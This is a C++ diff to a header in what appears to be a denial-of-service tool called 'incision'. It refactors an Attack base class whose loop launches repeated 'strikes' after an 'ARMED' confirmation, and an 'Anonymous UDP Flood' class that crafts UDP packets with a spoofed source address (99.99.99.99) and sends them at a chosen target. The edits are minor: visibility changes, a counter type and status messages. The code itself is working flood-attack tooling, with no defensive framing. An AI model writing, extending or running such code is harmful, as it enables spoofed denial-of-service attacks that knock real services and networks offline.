@@ -1,3 +1,4 @@
+#pragma once
 #include "../net/conn.h"
 #include "../net/uplink.h"
 #include "../net/smake.h"
@@ -18,18 +19,16 @@ namespace incision {
 
 	class Attack {
 
-		protected:
+		public:
 
 			string target;
 			data::Bytes payload;
-
-		public:
 
 			Attack() {}
 
 			virtual inline string getName() = 0;
 			virtual inline void atk() = 0; 
-			void attack(long long count, bool lm=false, bool hp=false) {
+			void attack(int count, bool lm=false, bool hp=false) {
 				if (lm) {
 					hideCursor();
 					if (hp) {
@@ -67,13 +66,16 @@ namespace incision {
 					}
 					cout << "    Systems: " << colors::colorize("ARMED", colors::OKGREEN) << endl;
 					if (notif::confirm()) {
+						cout << "Attack confirmed." << endl;
 						hideCursor();
 						if (hp) {
+							cout << "High power mode engaged." << endl;
 							for (int i = 0; i < count; i++) {
 								atk();
 								cout << "Strike launched: " << i + 1 << " of " << count << ", " << (count - i - 1) << " remaining                                         \r";
 							}
 						} else {
+							cout << "High power mode disengaged." << endl;
 							for (int i = 0; i < count; i++) {
 								atk();
 								usleep(10);
@@ -92,8 +94,8 @@ namespace incision {
 		private:
 
 			conn::UDPConnection udpc;
-			string target;
-			data::Bytes payload;
+			// string target;
+			// data::Bytes payload;
 
 		public:
 
@@ -115,12 +117,15 @@ namespace incision {
 
 			uplink::IPv4Uplink upl;
 			pktd::Packet pkt;
-			string target;
-			data::Bytes payload;
+			// string target;
+			// data::Bytes payload;
 
 		public:
 		
-			AnonymousUDPFlood(string target, int port=9999, data::Bytes payload=defaultPayload): target(target), payload(payload), pkt(smake::smakeUDP("99.99.99.99", target, port, port, payload)) {}
+			AnonymousUDPFlood(string tgt, int port=9999, data::Bytes pl=defaultPayload): pkt(smake::smakeUDP("99.99.99.99", tgt, port, port, pl)) {
+				target = tgt; 
+				payload = pl;
+			}
 
 			inline string getName() override { return "Anonymous UDP Flood"; }
 			inline void atk() override { upl.transmit(pkt); }
